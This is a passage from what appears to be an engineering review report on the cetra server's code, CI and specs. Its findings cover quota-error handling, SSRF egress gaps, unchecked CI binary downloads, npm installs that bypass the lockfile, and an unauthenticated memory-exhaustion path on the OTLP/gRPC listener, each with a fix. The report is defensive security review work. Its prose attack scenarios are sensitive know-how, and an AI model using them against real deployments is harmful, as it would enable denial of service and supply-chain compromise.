  - crates/eval/src/judge/http.rs:111-131 (only 429 + insufficient_quota → Pause)
  - docs/spec/06-evaluation.md:139 ('a pause-class error (401, 402, 403 that is not a content filter, 404, quota exhausted) pauses the rule at once')
  - docs/mvp-decisions.md D160, D166 (unchanged)
  - crates/eval/src/egress.rs:242-271 and the test's allowed list (0.0.0.1, 240.0.0.0, fec0::, 64:ff9b:1::7f00:1)
  - docs/roadmap.md:39 (E 'Done.', no open items)

**Problem.** E20 listed five open questions for a decision. None of them appears in mvp-decisions, the spec, the roadmap or track I's plans. A grep finds them only in the E README. The quota item is a substantive gap from spec 06: quota exhaustion should pause the rule at once, but only OpenAI's `insufficient_quota` is detected. Anthropic's low-credit 400 is Permanent, and Gemini's RESOURCE_EXHAUSTED 429 is Retryable. The D166 edge ranges are still allowed by the guard, and no decision accepts them (0.0.0.0/8 apart from 0.0.0.0, 240/4, fec0::/10, 6to4, local-use NAT64).

**Failure scenario.** An org's Anthropic account runs out of credit. Each sampled job fails as Permanent instead of pausing the rule, so the rule keeps enqueuing and calling until the 50%-of-last-50 breaker trips. With Gemini, each job is retried up to 6 times with backoff before it fails. The UI shows generic failures instead of the 'billing' pause the spec promises. The SSRF exceptions stay undocumented, so a later reviewer cannot tell an intentional allowance from a bug.

**Suggested fix.** The coordinator assigns the five items to I, which owns the eval queue and calls cetra-eval. Recommended: classify Anthropic's `billing_error` / credit-balance 400 and Gemini's RESOURCE_EXHAUSTED with a quota-type detail as Pause; deny the listed edge ranges in egress.rs, or add a D-I decision that allows them; settle header precedence. Record each choice as an amendment of D160 or D166 and remove the 'Needs a decision' list from the E README.

**Verifier evidence.** e-eval/README.md lists five open items under 'Needs a decision', at about lines 165-170. In judge/http.rs classify(), only 429 combined with insufficient_quota maps to Pause. tests/gemini.rs:398 asserts that (429, RESOURCE_EXHAUSTED) is Retryable, and no code handles Anthropic billing_error. Spec 06:139 says quota exhausted pauses the rule at once. No D-I decision or I plan covers the quota cases or the edge ranges: grep finds nothing beyond i-online-eval's unrelated rule quota. X12 is about the units-cap 402 on score writes, which is a different issue. Severity major is reasonable for the quota part; the edge ranges alone would be minor.

#### DE-4 — A categorical webhook evaluator with no categories passes validation and then fails every run

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** E (crates/eval), applied by I
- **References:**
  - crates/eval/src/config.rs:131-139 (webhook: any non-text data_type is Ok; categories not required)
  - crates/eval/src/webhook.rs:300-318 (categories.unwrap_or(&[]) → 'unknown label')
  - crates/server/src/eval/evaluator.rs:142-162 (prepare relies on Evaluator::validate)
  - crates/server/src/eval/definitions.rs:114-133 (fits_definition: webhooks need only equal types)
  - docs/plans/e-eval/README.md:168

**Problem.** For a judge, validate_output requires output.categories to equal the labels. For a webhook it accepts Categorical with `categories` set to None or `[]`. The webhook reader then matches every label against an empty list. The server's create and update path adds no check of its own. E20 found this, and nobody fixed it.

**Failure scenario.** A user creates a webhook evaluator with output_score {name: 'quality', data_type: 'categorical'} and no categories (or with no score definition that has categories). The API answers 201. Every job then fails permanently with 'unknown label', even when the webhook returns a valid label, until the error breaker pauses the rule.

**Suggested fix.** In EvaluatorConfig::Webhook's branch of validate_output, require a non-empty, unique `categories` list when data_type is Categorical. Reuse the label normalization from R5 and return field 'categories'. Add a config test and a server prepare test for 400 output_score.categories.

**Verifier evidence.** In crates/eval/src/config.rs:131-139, the Webhook arm accepts Numeric, Boolean and Categorical without checking categories. In server eval/evaluator.rs:125-170, prepare checks only the header errors and evaluator.validate(), and adds no check that webhook categories are present. The E README's 'Needs a decision' list records the same gap.

#### DE-5 — Webhook HTTP status classes differ from D160 and spec 06, and the difference is recorded only in the plan

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** E / coordinator
- **References:**
  - crates/eval/src/webhook.rs:243-249 (402 → Permanent, 410 → Pause, 403 always Pause)
  - docs/spec/06-evaluation.md § webhook ('Any other status is classified by D160') and :139
  - docs/mvp-decisions.md D160, D165
  - docs/plans/e-eval/README.md:173

**Problem.** Spec 06 and D165 say a webhook's non-200 status follows D160, under which 402 pauses the rule. The code classifies a webhook 402 as Permanent and a 410 as Pause, which D160 does not mention. The E20 review section lists this as 'settled', but the spec and the decisions were never amended, which AGENTS.md requires.

**Failure scenario.** A user's paid scoring webhook answers 402 when their plan runs out. Spec 06 and the UI copy promise an immediate pause. Instead every job fails permanently, and only the 50% breaker stops the rule. Track I's tests or UI written from the spec expect the pause.

**Suggested fix.** Choose one. Either align webhook.rs with D160 (402 → Pause, and decide whether 410 → Pause stays), or amend D165 and the spec 06 webhook paragraph with the webhook-specific table: 408/425/429/5xx retry, 401/403/404/410 pause, other statuses permanent.

**Verifier evidence.** In webhook.rs:243-249, classify_status sends 401, 403, 404 and 410 to Pause and everything else to Permanent, so 402 is Permanent. Spec 06 § webhook says 'Any other status is classified by D160'. D165 (mvp-decisions.md:218) says 'any other status follows D160', and spec 06:139 lists 402 as pause-class. The E README marks the difference as 'Recorded, settled…', but neither the spec nor the decisions were amended.

#### DE-7 — Stale plan READMEs: D says 'Nothing is implemented' and keeps D135's old encryption owner; E's D164 row disagrees with the spec

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** coordinator
- **References:**
  - docs/plans/d-meta-auth/README.md:13 ('Status: … Nothing is implemented.')
  - docs/plans/d-meta-auth/README.md D135 row ('Secret encryption (`CETRA_ENCRYPTION_KEY`, `rotate-encryption-key`) is E's'; superseded by D156)
  - docs/plans/e-eval/README.md:52 (D164: 'an empty `values` list is invalid configuration') vs docs/spec/06-evaluation.md § check Defaults and crates/eval/src/check.rs:61-83
  - docs/plans/e-eval/README.md:170 (E20 noted the D164 wording and left it)

**Problem.** Both plan READMEs are what an implementer reads first, and both now contradict main or the spec. D's status line says nothing is implemented. D's D135 row still makes E the owner of secret encryption, although D156 and spec 04:504 give it to track I. E's D164 row says an empty `values` list is invalid. The spec and the code say that omitting value and values compares with `expected`, and that only an empty needle string is invalid.

**Failure scenario.** A weaker model given a follow-up for D or E trusts the README. It treats D as unimplemented, looks for encryption in E's crate, or makes `values: []` a config error, which breaks the spec'd fallback to `expected` for existing evaluators.

**Suggested fix.** D README: set the status to 'P1–P25 implemented (#21, #25); P26 pending' and add '(superseded by D156: track I)' to the D135 row. E README: reword D164 to match spec 06 and remove the item from 'Needs a decision'.

**Verifier evidence.** d-meta-auth/README.md:13 says 'Nothing is implemented.' The D135 row (line 43) still says 'instance_settings comes with its first user (... track E). Secret encryption (CETRA_ENCRYPTION_KEY ...' is E's. e-eval/README.md:52 (D164) says 'an empty `values` list is invalid configuration'. Spec 06:75 instead says that omitting value and values compares with expected and that an empty needle string is invalid, and check.rs:61-83 falls back to expected when values is empty.

### Track F, phase 0 and maintenance

#### F0-1 — CI installs unchecked binaries (mold, actionlint, zizmor), in release jobs too, and the phase-0/D81 CI design changed with no decision

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** coordinator (CI, phase-0 follow-up)
- **References:**
  - .github/actions/rust/action.yml:24-32 (mold 3.0.0 x86_64-linux tarball downloaded with curl, no checksum, unpacked with sudo into /usr/local, no `if: runner.os == 'Linux'`)
  - .github/workflows/ci.yml:177-187 (actionlint downloaded with curl, no checksum; zizmor installed by `uv tool install zizmor==1.32.0`, transitive deps not hash-locked; the comment cites install-action v2.89.1 while v2.90.0 is pinned)
  - .github/workflows/release.yml:62-68, 121, 131 (the linux matrix includes ubuntu-24.04-arm and the macos-15 job; all use ./.github/actions/rust)
  - .github/actions/packaging/action.yml:37-46 (kubeconform: the repo's own pattern of a pinned sha256 checked with `sha256sum -c`)
  - docs/plans/phase-0/06-ci-and-closeout.md § Versions and pinning (tools via taiki-e/install-action; Swatinem/rust-cache; 'Add no others unless …'; every `run:` is a just recipe or a one-line setup command)
  - docs/mvp-decisions.md:134 (D81 says nothing about the kache/Garage S3 cache, its secrets and the `s3-cache` environment, or mold; these live only in .github/README.md)

**Problem.** Phase 0 installed every CI tool through taiki-e/install-action, which verifies checksums. Later commits (e5bd358, 7828691, 4891edf) changed this.
- The shared `rust` composite action now curls a mold release tarball and unpacks it as root into /usr/local with no checksum check.
- The `workflows` job curls actionlint the same way.
- Because the composite action is shared, the mold step also runs in release.yml: on the arm64 Linux runner and on macOS it installs an x86_64 Linux binary that is never used, since release builds do not set the mold RUSTFLAGS.
- The CI design also moved from Swatinem/rust-cache (save on main only) to a kache S3 cache. Jobs hold write credentials and owner PRs write to a PR prefix.
- None of this is in D81 or any decision. It is documented only in .github/README.md.

**Verifier correction.** Release jobs install mold but never invoke it. The main exposure is in the CI jobs that link with mold and hold the kache S3 credentials. In the release jobs it is a wasted step, and a tampered binary there could still land on PATH.

**Failure scenario.** A tampered or replaced asset on the mold or actionlint GitHub release is unpacked as root into /usr/local/bin. This happens in the jobs that hold the S3 cache write keys (rust-lint, rust-test, e2e, check-packaging) and in the release jobs that build and attest the shipped binaries. It can shadow tools on PATH or poison the compiler cache that main reads. Nothing detects it, while kubeconform in the same repo would fail its sha256 check.

**Suggested fix.** Pin a sha256 for each curl download (mold x86_64; actionlint), following the kubeconform step. Guard the mold step with `if: runner.os == 'Linux' && runner.arch == 'X64'`, or move it out of the shared composite into the jobs that link with mold. Install zizmor from a hash-pinned requirement or a release binary with a checksum. Update the stale install-action comment. Amend D81, or add a coordinator decision, recording the kache S3 cache (who may write, the secrets, the environment) and mold.

**Verifier evidence.** .github/actions/rust/action.yml:23-31 curls mold-3.0.0-x86_64-linux.tar.gz and runs `sudo tar -xzf ... -C /usr/local` with no checksum and no runner.os/arch guard. ci.yml:177-187 curls actionlint with no checksum, installs zizmor with `uv tool install zizmor==1.32.0`, and the comment still says install-action v2.89.1 while v2.90.0 is pinned (line 180). release.yml:79 and :131 use ./.github/actions/rust on the ubuntu-24.04-arm and macos-15 runners, and only ci.yml:22 sets the mold RUSTFLAGS, so release jobs install a binary they never use. packaging/action.yml:37-46 checks kubeconform with `sha256sum -c`. Phase-0 06-ci-and-closeout.md:67/133/136 specifies Swatinem/rust-cache and taiki-e/install-action and says 'Add no others unless…'. D81 (mvp-decisions.md:134) and the roadmap do not mention kache or mold.

#### F0-2 — `just ts-smoke` now resolves the SDK's dependencies fresh from npm, bypassing the lockfile and D74's 7-day age gate

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** coordinator (CI) with F
- **References:**
  - justfile:91-103 (ts-smoke: `npm install --no-audit --no-fund --ignore-scripts "$tarball"` in a scratch dir, then imports `cetra` under ESM and CJS)
  - docs/plans/phase-0/06-ci-and-closeout.md:232 ('The package has no dependencies, so `npm install` fetches nothing from the registry')
  - sdks/typescript/package.json dependencies (five @opentelemetry packages) and the non-optional peer `@opentelemetry/api` `>=1.9.0 <1.10.0`
  - node_modules/.pnpm …/@opentelemetry/core, resources, sdk-trace, sdk-logs: `@opentelemetry/semantic-conventions ^1.29.0`; api-logs: `@opentelemetry/api ^1.3.0`
  - .github/workflows/ci.yml ts-sdk-min-node job (runs ts-smoke on Node 22.12 in every PR); docs/plans/f-sdk/03-typescript.md T13 checks and 04-review.md item 7 (ts-smoke on the packed SDK)
  - pnpm-workspace.yaml minimumReleaseAge: 10080 (D74)

**Problem.** The recipe was designed when the TS package had no dependencies. Since F's T1 the tarball has five OTel dependencies with ranged transitive deps and a required peer that npm 7+ auto-installs. The scratch `npm install` has no lockfile and no `--before` age limit. On every PR it therefore resolves whatever is newest on the registry, ignoring D74's minimumReleaseAge, and then runs that code through `import`/`require`. `--ignore-scripts` stops install scripts, not the code that is executed. The plan text claiming nothing is fetched is now false.

**Verifier correction.** The finding lists the wrong dependencies: they are context-async-hooks, core, otlp-transformer, resources and sdk-trace, not sdk-logs/api-logs. The substance stands.

**Failure scenario.** A malicious or broken `@opentelemetry/semantic-conventions` or `@opentelemetry/api` 1.9.x patch published an hour earlier is installed and executed by the ts-sdk-min-node job. In the benign case, an unrelated upstream release turns ci-ok red on PRs that changed nothing, with no lockfile to reproduce it.

**Suggested fix.** In ts-smoke, pass an age gate, e.g. `npm install --before "$(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ)" …`, which Node 22.12's npm 10 supports. Alternatively, install the tarball's dependency closure from the repo lock (e.g. `pnpm deploy`/`pnpm pack` plus an npm shrinkwrap). Update the phase-0 plan sentence and the recipe comment to say the smoke test fetches the SDK's dependencies.

**Verifier evidence.** justfile:91-103 runs `npm install --no-audit --no-fund --ignore-scripts "$tarball"` in a mktemp dir with no lockfile and no `--before`, then imports the package. The packed package.json:59-65 has five exact-pinned @opentelemetry dependencies (context-async-hooks, core, otlp-transformer, resources, sdk-trace) whose own transitive ranges float, plus the non-optional peer `@opentelemetry/api >=1.9.0 <1.10.0`. ci.yml ts-sdk-min-node (lines 108-132) runs `just ts-smoke` on every PR and is part of ci-ok. phase-0/06-ci-and-closeout.md:232 still says 'The package has no dependencies, so `npm install` fetches nothing from the registry.' pnpm-workspace.yaml:6 sets minimumReleaseAge 10080, which a scratch npm install does not honour.

#### F0-3 — Spec 10 says both SDK READMEs list the language differences; the Python README lists almost none, and the two differences X1 accepted are recorded nowhere

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** F
- **References:**
  - docs/spec/10-sdk.md:161-169 § Language differences ('Known, accepted differences that the fixtures do not cover. The SDK READMEs list them.')
  - docs/plans/f-sdk/README.md § Language differences (same sentence)
  - sdks/python/README.md:433-459 § Known limits (abandoned async generators, OTEL_EXPORTER_OTLP_HEADERS; no zero-argument/None, integral-float, large-integer or resource-attribute entries)
  - sdks/typescript/README.md:271-288 § Known limits (lists zero-arg, integral floats, resource attributes, abandoned generators)
  - docs/plans/f-sdk/04-review.md:36 ('Accepted differences left as is: TS `setUsage` accepts only safe integers …, Python's `Retry-After` parsing accepts "+5" via `int()`')
  - sdks/python/src/cetra/_scores.py:366-377 (`int(header)`: also accepts ' 5', '1_0' and non-ASCII digits) vs sdks/typescript/src/scores.ts:417-423 (digit regex)
  - docs/spec/10-sdk.md § Lifecycle 'Score delivery' (Retry-After: 'a non-negative integer number of seconds')

**Problem.** F's shared contract says each README lists the cross-language differences.
- The TypeScript README does.
- The Python README covers only the two items P12 explicitly asked for. Python users are never told that `1.0` is a double here and an int in TS, that a zero-argument function records `{}`, that ints beyond 2^53 are written as JSON numbers, or that `OTEL_RESOURCE_ATTRIBUTES` is read only by Python.
- X1 also accepted two new divergences from the shared contract: `setUsage` limited to safe integers in TS, and Python's lenient `Retry-After` parsing. These went into the plan's review notes only, not into spec 10 § Language differences or either README. Spec 10 still states one Retry-After grammar for both SDKs.

**Verifier correction.** The 'X1' in the finding is 04-review.md's own accepted-differences note, not cross-track finding X1.

**Failure scenario.** A later track (P M3's 402 pause reuses `int(retry_after)` in Python and a digit check in TS) or a reader of spec 10 assumes both SDKs parse `Retry-After` identically and writes one cross-SDK test that fails on one side. A Python user comparing spans from both SDKs files bugs for documented-but-unlisted differences.

**Suggested fix.** Add a 'Language differences' list to sdks/python/README.md Known limits mirroring spec 10 § Language differences. Add the two X1-accepted differences (TS setUsage safe integers; Python `int()` Retry-After leniency) to spec 10 § Language differences and both READMEs. Alternatively, make Python's Retry-After parse match the spec's ASCII-digit grammar and drop the second item.

**Verifier evidence.** Spec 10 § Language differences says 'The SDK READMEs list them.' and lists zero-arg/None, integral floats, large integers, resource attributes, exporter env and abandoned generators. sdks/python/README.md:433-460 Known limits covers only abandoned async generators and OTEL_EXPORTER_OTLP_HEADERS from that list. sdks/typescript/README.md:271-288 covers zero-arg, integral floats/bigint, resource attributes and generators. f-sdk/04-review.md:36 accepts the TS setUsage safe-integer limit and Python `int()` Retry-After leniency, but neither appears in spec 10 § Language differences or in either README. _scores.py:372 uses `int(header)`, which accepts '+5', ' 5', '1_0' and Unicode digits. scores.ts:419-420 trims and applies a digit regex. Spec 10:51 states one 'non-negative integer' rule for both SDKs.

#### F0-5 — Spec 10 says non-tracing calls use a REST client generated from OpenAPI; F shipped hand-written score transports

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** F (spec 10 wording), coordinator
- **References:**
  - docs/spec/10-sdk.md:3 ('everything else uses a small REST client generated from the OpenAPI spec')
  - docs/mvp-decisions.md:70 (D17: 'REST client for datasets/experiments/scores')
  - sdks/python/src/cetra/_scores.py (hand-written `requests.Session().post` to /api/v1/scores)
  - sdks/typescript/src/scores.ts and browser.ts (hand-written fetch to /api/v1/scores and /api/public/feedback)
  - docs/plans/f-sdk/01-shared.md F1 (rewrote § Design rules, § Lifecycle, § Testing, but not the intro sentence)

**Problem.** F's score and feedback transports are intentionally small, hand-written and dependency-free: requests in Python, fetch in TS. No OpenAPI-generated client exists in either SDK. F1 rewrote most of spec 10 but left the intro sentence claiming every non-OTLP call goes through a generated client. Today that describes no code. It is also a constraint the future J track (`cetra.Client`, datasets, experiments) would read as binding.

**Failure scenario.** Track J's planner reads spec 10's intro, and adds an OpenAPI code generator and its runtime dependency to both SDKs. It then either rewrites F's score transport to match, which goes against F's retry/queue contract, or leaves two HTTP clients in each SDK.

**Suggested fix.** Change spec 10's intro to: 'everything else is plain JSON over HTTP (`requests` in Python, `fetch` in TypeScript); scores and feedback use small hand-written clients (D-F-1, D-F-16)'. Leave the generated-client question to J's design and record it there if J chooses one.

**Verifier evidence.** docs/spec/10-sdk.md:3: 'everything else uses a small REST client generated from the OpenAPI spec'. Neither sdks/python/pyproject.toml nor sdks/typescript/package.json references openapi or a generator. The score transports are hand-written: _scores.py with requests, and scores.ts/browser.ts with fetch. Spec 10:217 describes the score transport (D-F-1, D-F-2) without mentioning a generated client, so the intro sentence contradicts the body. D17 says only 'REST client', not 'generated'.

### Track G — spine

#### G-1 — OTLP/gRPC decodes and inflates up to 32 MiB per stream before authentication and outside the in-flight budget

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** security-privacy · **Owner:** G (server; coordinator to schedule as a G follow-up)
- **References:**
  - crates/server/src/ingest/grpc.rs:65-72 (service: max_decoding_message_size + accept_compressed(Gzip), no interceptor)
  - crates/server/src/ingest/grpc.rs:77-104 (bearer_principal, key_only_project and reserve_exact all run inside export, after tonic has decoded the message)
  - crates/server/src/serve.rs:419-423 (Server::builder() with no max_concurrent_streams, concurrency_limit_per_connection or connection cap)
  - docs/mvp-decisions.md D-G-5 (budget 'bounds the request bytes held at once', reserved before reading), D-G-29 ('the in-flight budget reserves the message's encoded size')
  - docs/plans/g-spine/03-m3-writes-grpc-usage.md G3.8 export steps 1-5
  - docs/spec/12-operations.md grpc_addr default 0.0.0.0:4317

**Problem.** For a unary call, tonic reads the whole body, gunzips it up to `ingest.max_grpc_message_bytes` (32 MiB) and prost-decodes it before `TraceService::export` runs. Only then does G's code check the `authorization` metadata and reserve budget, and the reservation is the encoded size of a message that is already fully in memory. On the HTTP routes, by contrast, the access middleware authenticates and `reserve` runs before a single body byte is read. The gRPC listener binds 0.0.0.0:4317 by default and sets no stream or connection concurrency limit. D-G-5's memory bound and D-G-29's claim that the budget covers gRPC therefore do not hold, and anyone can reach the decoder without a credential.

**Verifier correction.** Mostly accurate. One nuance: D-G-29 itself records that the reservation is the decoded message's encoded size, so the gap is between D-G-29 and D-G-5's bound, not a silent implementation slip. Authentication after the decode is undocumented, and it is the main problem.

**Failure scenario.** An unauthenticated client opens a few HTTP/2 connections to :4317. On each it opens many concurrent `TraceService/Export` streams, each with a gzip body of a few tens of KiB that inflates to just under 32 MiB. Every stream allocates and decodes about 32 MiB, plus the prost structures, before `export` answers `Unauthenticated`. Some hundreds of concurrent streams exhaust memory, and the single-process server is OOM-killed with all its tenants. `max_inflight_bytes` (256 MiB) never refuses anything, because nothing reserves before the decode.

**Suggested fix.** Authenticate and reserve before the decoder runs. Wrap the service in a tower layer (`Server::builder().layer(..)` or `ServiceBuilder` around `TraceServiceServer`) that reads the `authorization` header from the `http::Request`. It runs `bearer_principal` plus the ingest-scope and `key_only_project` checks (async, so a tonic `Interceptor` is not enough), and answers `Unauthenticated`/`PermissionDenied` without polling the body. The layer then takes a `Reservation` of `max_grpc_message_bytes` (refusing with `Unavailable` when the budget is full) and passes the principal, project and reservation to `export` through request extensions. `export` drops its own auth and `reserve_exact`. Also set `max_concurrent_streams` (for example 100) and `concurrency_limit_per_connection`. Update D-G-29, spec 02's gRPC row and the G3.8 text. Tests in serve.rs over TCP: (1) with `max_grpc_message_bytes = 1 KiB`, an unauthenticated 4 KiB message answers `Unauthenticated`, not `OutOfRange`, which proves auth runs before the decode; (2) with `max_inflight_bytes == max_grpc_message_bytes` and one reservation held, an authenticated export answers `Unavailable` before decoding.

**Verifier evidence.** crates/server/src/ingest/grpc.rs:66-72 builds TraceServiceServer with only max_decoding_message_size(limit) and accept_compressed(Gzip). No interceptor or layer. export_request (grpc.rs:77-104) receives an already-decoded tonic::Request<ExportTraceServiceRequest>, and only then runs bearer_principal, the scope check, key_only_project and reserve_exact(message.encoded_len()). serve.rs:419-423 calls tonic Server::builder().add_service(service) with no concurrency, stream or connection limits. config.rs:721-722 defaults grpc_addr to 0.0.0.0:4317 (spec 12:15). D-G-5 (mvp-decisions:314) says the budget is reserved 'before reading its body'. D-G-29 (:338) does say the budget reserves the encoded size, so reserving after the decode is written into the decision. But that means D-G-5's memory bound does not hold for gRPC, and unauthenticated callers can make the server gunzip and decode up to 32 MiB per stream. The cross-track review has no gRPC finding.

#### G-2 — D-G-38's wait for running commits adds up to 30 s to shutdown that neither spec 12 nor N's 60 s grace period includes

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** G (with N for the grace period if it changes)
- **References:**
  - crates/server/src/serve.rs:36-39 (DRAIN 20 s, STORAGE_SHUTDOWN 30 s), :618-624 (wait_for_commits bounded by STORAGE_SHUTDOWN), :633 (storage shutdown, another 30 s)
  - docs/mvp-decisions.md D-G-38
  - docs/plans/g-fixes/04-commit-task.md § 4
  - docs/spec/12-operations.md § Process lifecycle, Shutdown bullet (drain <= 20 s, flush <= 30 s; no commit wait, no usage or last_used flush, no live-stream close)
  - docs/plans/n-packaging/README.md:470 ('SIGTERM drains (<= 20 s) and flushes (<= 30 s): allow 60 s')
  - deploy/compose/compose.yaml:15 stop_grace_period: 60s; deploy/helm/cetra/templates/statefulset.yaml:42 terminationGracePeriodSeconds: 60

**Problem.** F4 inserted a wait for detached commits, bounded by its own 30 s (`STORAGE_SHUTDOWN`), between the 20 s HTTP drain and the 30 s storage shutdown. The worst case is now 80 s. N sized the container grace periods at 60 s from spec 12's 20 + 30 budget, and neither spec 12 nor D-G-38 mentions the new step.

**Failure scenario.** During a rolling upgrade on Helm, a commit whose request was dropped hangs on a slow S3 `put_media`. The drain takes 20 s and the commit wait 30 s. Kubernetes then SIGKILLs the pod 10 s into `storage.shutdown()`. The usage and last_used flushes did run, but the memtables are never flushed, so the next start replays the WAL. The rollout is slower than N documents, and `docker compose stop` is likewise documented as taking 'up to 60 s'.

**Suggested fix.** Bound `wait_for_commits` by what remains of the drain budget, or by a short constant (for example 5 s), so that drain + commits + storage stays at or under 50 s. Alternatively raise N's grace periods and docs to match. Rewrite spec 12 § Process lifecycle's Shutdown bullet in the code's order: close live streams, drain (20 s), wait for detached commits (D-G-38, Ns), flush last_used and usage, flush storage (30 s), close SQLite.

**Verifier evidence.** serve.rs:36-39 defines DRAIN = 20 s and STORAGE_SHUTDOWN = 30 s. In shutdown, the drain runs first, then wait_for_commits is wrapped in timeout(STORAGE_SHUTDOWN), then the last_used and usage flushes, then timeout(STORAGE_SHUTDOWN, storage.shutdown()). The worst case is about 80 s. Spec 12:81's Shutdown bullet lists only drain <= 20 s and flush <= 30 s, with no commit wait. D-G-38 (mvp-decisions:347) says the wait is 'bounded by the storage shutdown timeout'. n-packaging/README.md:470 says 'allow 60 s', and compose.yaml:15 and statefulset.yaml:42 set 60 s. The worst case needs a commit stuck for 30 s, so minor is right.

#### G-3 — G's requests to B1 and A1 never got an owner; a long MIME type still fails the whole OTLP request

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** coordinator (B1, A1 execute)
- **References:**
  - docs/plans/g-spine/00-design.md § Requests to other tracks (lines 301-303) and § Open items (line 317)
  - crates/otel/src/media.rs:491-503 (is_mime checks characters only, no length cap)
  - crates/storage/src/media.rs:33 (MIME type 1 to 255 bytes)
  - crates/server/src/ingest/mod.rs:972-980 (test commit_refuses_an_invalid_mime_type_and_appends_nothing: a 300-byte MIME fails the commit)
  - crates/storage/src/error.rs:86 (AppendError doc still says 'Backpressure is 429'; D-G-3 makes it 503)
  - docs/mvp-decisions.md D-G-24 ('A size-only lookup is requested from A1')
  - docs/roadmap.md (no row or milestone holds any of the three)

**Problem.** G's design asked B1 to cap an extracted blob's MIME type at 255 bytes with a fallback, and asked A1 to fix `AppendError`'s doc and to add a size-only `media_info` lookup. None of the three was done, and no roadmap row, plan or decision assigns them. As a result, one span carrying a data URI or blob with a 256-byte or longer token-only MIME type makes `put_media` return `Invalid`. The whole OTLP request then gets a 400, or a gRPC `InvalidArgument`, which exporters do not retry. Separately, every `Range` request on media still reads the whole blob of up to 32 MiB (D-G-24).

**Failure scenario.** An instrumented app forwards user-supplied attachments with an unusual long MIME type. The batch of up to 50 000 spans that holds that one span is refused with 400 and dropped by the exporter, and every other span in it is lost. A storage implementer who reads `AppendError`'s doc maps backpressure to 429 again, against D-G-3.

**Suggested fix.** Assign the three requests: B1 caps the MIME type at 255 bytes in `resolve_mime`, falling back to `application/octet-stream`, with a golden fixture; A1 fixes the doc comment; A1 adds `media_info` or D-G-24 records that it is dropped. Give them a roadmap row, for example an A1/B1 follow-up. Once B1 lands, G changes the ingest test above to expect the fallback.

**Verifier evidence.** g-spine/00-design.md:301-303 holds the B1 MIME cap request, the A1 AppendError doc request and the A1 media_info request. On origin/main, crates/otel/src/media.rs is_mime/resolve_mime has no length check, and crates/storage/src/error.rs:86 still says 'Backpressure is 429'. Storage's MediaBlob doc requires a 1-255 byte MIME type. ingest/mod.rs test commit_refuses_an_invalid_mime_type_and_appends_nothing confirms that a 300-byte MIME type fails the whole commit. The roadmap has no row naming any of the three. A token-only MIME type longer than 255 bytes is rare in practice, so minor fits.

#### G-4 — G review backlog (m-3, m-6, m-7, m-11) has no owner; m-6 now loses billable units

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** coordinator (G executes)
- **References:**
  - docs/reviews/g-spine.md m-6 and § Fixes ('m-3, m-6, m-7 and m-11 are a backlog')
  - docs/roadmap.md G row ('m-3, m-6, m-7 and m-11 are a backlog'), with no owner or milestone
  - crates/server/src/usage.rs flush (mem::take before meta.write; restore only on a returned error)
  - crates/server/src/meta/mod.rs:111-134 (write awaits the single writer mutex and the transaction inline)
  - crates/server/src/serve.rs:556-568 spawn_usage, and the task.abort() loop before the final flush in shutdown
  - docs/spec/12-operations.md:99 (monthly units from usage_daily plus unflushed counts); D-I-31 (judge usage columns)

**Problem.** The backlog has no owning track and no roadmap item. m-6 mattered little when the review was written, but `usage_daily` now drives P's units cap and billing and I's judge-cost columns. The loss window is also wider than the review stated: after `mem::take` the flush waits on the shared `meta.db` writer mutex, which the deletion worker, retention and other writers also take, so the shutdown abort can land anywhere in that wait.

**Failure scenario.** SIGTERM arrives while the 10 s usage flush has taken its counts and waits on the meta writer behind a long deletion-worker transaction. `shutdown` aborts the task, and the taken spans, scores and judge tokens are neither in memory nor in `usage_daily`, so those units are never billed or counted against the cap.

**Suggested fix.** Assign the backlog to a named follow-up, for example a G-fixes-2 phase. For m-6, stop the usage task with a cancellation signal and let an in-flight flush finish, or put the taken rows back unless the write committed (take inside the write closure). Add a test that aborts mid-flush and checks that the counts survive.

**Verifier evidence.** reviews/g-spine.md:80 (m-6) describes the abort-after-take loss. usage.rs:155-195 does std::mem::take on the counts, then meta.write(...).await, and restores the counts only on a returned Err. meta/mod.rs:111-134 shows write awaiting self.writer.lock() and the transaction inline, not in a spawned task, so an abort while it waits for the mutex drops the taken rows. serve.rs shutdown aborts every task (tasks.drain(..) with abort) before the final usage.flush. The roadmap G row only calls m-3/m-6/m-7/m-11 'a backlog', with no owner. That usage_daily now feeds billing and judge costs is plausible from the cited spec and D-I-31, and it does not change the severity.

#### G-5 — g-spine/00-design.md was not updated by g-fixes and contradicts the current decisions

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** G (docs)
- **References:**
  - docs/plans/g-spine/00-design.md:7 (Status names the unmerged branches claude/g-m3-impl, g-m4-impl, g-m5-impl)
  - 00-design.md:34 D-G-18 row ('with memory-serve', 'release CI checks that the UI is embedded') vs mvp-decisions D-G-18/D-G-35/D-G-37
  - 00-design.md:38 D-G-22 row ('filter and search are checked when the stream opens') vs amended D-G-22
  - 00-design.md:50 D-G-34 row (no 15-minute max age or 30 s send timeout)
  - 00-design.md:15-53 (decision table stops at D-G-37: no D-G-38, D-G-39)
  - 00-design.md:184 and :308 (track I calls `commit` directly) vs D-G-38 / commit_in_task
  - 00-design.md:243-244 (SPA fallback for extension-less paths; old CSP without base-uri/form-action) vs F1
  - 00-design.md:316 (open item about memory-serve's API)
  - docs/plans/g-fixes/README.md 'After the plan' (the roadmap and review were updated, the design was not)

**Problem.** Other tracks' plans list the G design as background reading, but its decision table and architecture sections still describe the state before the fixes. In those sections: memory-serve embedding, search validated at open, no stream age limit, the old CSP, dotted paths treated as files, judge traces committed through `Ingest::commit` and not `commit_in_task`, and no D-G-38 or D-G-39. The g-fixes plan updated mvp-decisions and the specs but never listed this file.

